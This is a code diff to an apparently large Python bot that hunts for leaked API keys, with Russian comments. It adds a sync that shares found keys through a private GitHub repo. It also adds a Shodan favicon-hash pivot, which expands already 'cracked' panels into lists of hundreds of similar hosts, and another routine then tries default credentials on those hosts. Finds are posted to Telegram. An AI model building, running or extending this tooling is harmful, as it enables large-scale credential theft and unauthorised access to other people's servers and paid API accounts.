@@ -6866,6 +6866,120 @@ def save_seen(seen):
     os.replace(tmp, SEEN_PATH)
 
 
+# ------------------------------------------------------------------ VAULT SYNC
+# ОДИН МОЗГ НА ДВОИХ: локальный бот и GH-бот дедупятся через vault-репо —
+# иначе одна и та же находка летит в TG дважды (сторы-то разные). Локальный
+# тянет хэши находок из vault каждый цикл (дешёвый raw-фетч), и пушит свои
+# находки обратно каждый 4-й цикл. GH-бот делает то же самое своим сторонам.
+VAULT_REPO = CFG.get("vault_repo", "Ins2lt/night-vault")
+
+
+def vault_pull_hashes(seen):
+    """+хэши находок из vault-репы в seen. Возвращает число добавленных."""
+    tok = gh_token()
+    if not tok:
+        return 0
+    try:
+        r = requests.get(
+            "https://raw.githubusercontent.com/%s/main/keyhunter_found.jsonl"
+            % VAULT_REPO,
+            headers={"Authorization": "Bearer " + tok},
+            timeout=(8, 25),
+            verify=False,
+        )
+        if r.status_code != 200:
+            return 0
+        added = 0
+        for line in r.text.splitlines():
+            try:
+                d = json.loads(line)
+            except Exception:
+                continue
+            k, b = d.get("key"), d.get("base")
+            if not k:
+                continue
+            h = khash(k, b)
+            if h not in seen:
+                seen.add(h)
+                added += 1
+        return added
+    except Exception:
+        return 0
+
+
+def vault_push_finds():
+    """Мерж локального found.jsonl в vault (дедуп по хэшу). PUT через
+    contents API. Раз в 4 цикла — дальше GH-бот подтянет наши находки и
+    перестанет их постить повторно."""
+    tok = gh_token()
+    if not tok:
+        return
+    import base64 as _b64
+
+    try:
+        local_lines = []
+        if os.path.exists(STORE_PATH):
+            with open(STORE_PATH, encoding="utf-8", errors="replace") as f:
+                local_lines = [l for l in f.read().splitlines() if l.strip()]
+        if not local_lines:
+            return
+        api = (
+            "https://api.github.com/repos/%s/contents/keyhunter_found.jsonl"
+            % VAULT_REPO
+        )
+        hdrs = {
+            "Authorization": "Bearer " + tok,
+            "Accept": "application/vnd.github+json",
+        }
+        r = requests.get(api, headers=hdrs, timeout=(8, 20), verify=False)
+        sha, remote_text = None, ""
+        if r.status_code == 200:
+            j = r.json()
+            sha = j.get("sha")
+            try:
+                remote_text = _b64.b64decode(j.get("content") or "").decode(
+                    "utf-8", errors="replace"
+                )
+            except Exception:
+                remote_text = ""
+        have = set()
+        for line in remote_text.splitlines():
+            try:
+                d = json.loads(line)
+                have.add(khash(d.get("key", ""), d.get("base")))
+            except Exception:
+                continue
+        merged = remote_text.rstrip("\n")
+        added = 0
+        for line in local_lines:
+            try:
+                d = json.loads(line)
+            except Exception:
+                continue
+            h = khash(d.get("key", ""), d.get("base"))
+            if h in have:
+                continue
+            have.add(h)
+            merged += "\n" + line
+            added += 1
+        if not added:
+            return
+        import base64 as _b64
+
+        body = {
+            "message": "vault sync from local %s"
+            % time.strftime("%FT%TZ", time.gmtime()),
+            "content": _b64.b64encode((merged + "\n").encode()).decode(),
+        }
+        if sha:
+            body["sha"] = sha
+        pr = requests.put(api, headers=hdrs, json=body, timeout=(10, 30), verify=False)
+        if pr.status_code in (200, 201):
+            log("  🧠 vault sync: +%d находок ушло в общий мозг" % added)
+    except Exception:
+        pass
+
+
 def khash(key, base):
     return hashlib.sha1((key + "|" + (base or "?")).encode()).hexdigest()[:16]
 
@@ -11543,6 +11657,95 @@ def opendb_sweep(cycle):
     return out
 
 
+def favicon_pivot_sweep(cycle):
+    """🔍 FAVICON-PIVOT (умножитель панелей): у каждого софта свой favicon-хэш.
+    Берём favicon уже ВСКРЫТЫХ new-api панелей -> shodan http.favicon.hash
+    выдаёт ВСЕ такие панели интернета разом -> складываем в файл, который
+    newapi-sweep обходит на дефолт-креды. Одна вскрытая панель = кластер сотен."""
+    try:
+        import mmh3
+    except ImportError:
+        return
+    keys = Shodan()._key_pool()
+    if not keys:
+        return
+    roots = set()
+    # вскрытые панели — эталонный favicon софта (самый точный пивот)
+    try:
+        cracked = json.load(
+            open(os.path.join(HERE, "newapi_cracked.json"), encoding="utf-8")
+        )
+        roots.update(list(cracked.keys())[:3])
+    except Exception:
+        pass
+    try:
+        with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
+            for r in json.load(f)[:3]:
+                d = r.get("domain")
+                if d:
+                    roots.add("https://" + d.strip("/"))
+    except Exception:
+        pass
+    if not roots:
+        return
+    hashes = set()
+    for root in sorted(roots):
+        try:
+            r = http("GET", root.rstrip("/") + "/favicon.ico", timeout=(4, 8))
+            if r.status_code == 200 and r.content:
+                import base64 as _b64
+
+                hashes.add(mmh3.hash(_b64.encodebytes(r.content)))
+        except Exception:
+            continue
+    if not hashes:
+        return
+    # цели -> в файл, который newapi-sweep инжестит (ip:port)
+    hosts_path = r"C:\Temp\opencode\all_setup_hosts.json"
+    try:
+        existing = set(json.load(open(hosts_path, encoding="utf-8")))
+    except Exception:
+        existing = set()
+    new_hosts = set()
+    page = 1 + (int(time.time() // 3600) % 5)
+    for h in hashes:
+        try:
+            r = requests.get(
+                "https://api.shodan.io/shodan/host/search",
+                params={
+                    "key": keys[0],
+                    "query": "http.favicon.hash:%d" % h,
+                    "page": page,
+                },
+                timeout=(10, 30),
+                verify=False,
+            )
+            if r.status_code != 200:
+                continue
+            total = r.json().get("total") or 0
+            for mtc in (r.json().get("matches") or [])[:40]:
+                ip, port = mtc.get("ip_str"), mtc.get("port")
+                if ip and port:
+                    cand = "%s:%s" % (ip, port)
+                    if cand not in existing:
+                        new_hosts.add(cand)
+            if total:
+                log("  🔍 PIVOT: favicon %d -> %d панелей в shodan" % (h, total))
+        except Exception:
+            continue
+    if new_hosts:
+        existing |= new_hosts
+        try:
+            os.makedirs(os.path.dirname(hosts_path), exist_ok=True)
+            json.dump(sorted(existing), open(hosts_path, "w", encoding="utf-8"))
+        except Exception:
+            pass
+        post_telegram(
+            "🔍 FAVICON-PIVOT: +%d новых панелей в обход крякера (всего %d)"
+            % (len(new_hosts), len(existing))
+        )
+
+
 def self_keysmith(cycle):
     """🔑 САМООБЕСПЕЧЕНИЕ: бот добывает НЕДОСТАЮЩИЕ ключи источников из чужих
     конфигов, валидирует боевым запросом и вписывает себе. fofa — в конфиг,
@@ -11744,6 +11947,12 @@ def run_once(extra_paths=(), post=True):
     chunks = run_sources(extra_paths)
     log("=== EXTRACT ===")
     seen = load_seen()
+    try:
+        _vadded = vault_pull_hashes(seen)
+        if _vadded:
+            log("  🧠 vault: +%d хэшей второго бота в дедуп" % _vadded)
+    except Exception:
+        pass
     candidates = {}
     # теги-префиксоловушки: если тот же ключ выловлен специфичным тегом — мусорный вон
     JUNKY_TAGS = (
@@ -12565,6 +12774,17 @@ def main():
             log("🔬 DEEP MODE: gist pagination x30")
         run_once(post=not args.no_post)
     elif args.cmd in ("monitor", "loop"):
+        # ротация лога: >5MB -> оставляем последний 1MB (иначе недели роста
+        # съедят диск и замедлят tail)
+        try:
+            if os.path.getsize(LOG_PATH) > 5_000_000:
+                with open(LOG_PATH, "rb") as f:
+                    f.seek(-1_000_000, os.SEEK_END)
+                    tail = f.read()
+                with open(LOG_PATH, "wb") as f:
+                    f.write(b"... rotated ...\n" + tail)
+        except Exception:
+            pass
         log("🔔 MONITOR: проход каждые %ds. Ctrl+C — стоп." % every)
         log("   автодроп находок: %s" % DESKTOP_DROP)
         log("   TG-постинг: включён (бот ждёт /start для захвата chat_id)")
@@ -12612,6 +12832,16 @@ def main():
                 opendb_sweep(cycle)
             except Exception as e:
                 log("opendb sweep err: %s" % e)
+            # VAULT SYNC + FAVICON PIVOT: каждый 4-й цикл
+            if cycle % 4 == 0:
+                try:
+                    vault_push_finds()
+                except Exception:
+                    pass
+                try:
+                    favicon_pivot_sweep(cycle)
+                except Exception as e:
+                    log("favicon pivot err: %s" % e)
             # ревалидация каждые 4 цикла: чистим мёртвые ключи из стора
             if cycle % 4 == 0:
                 try:
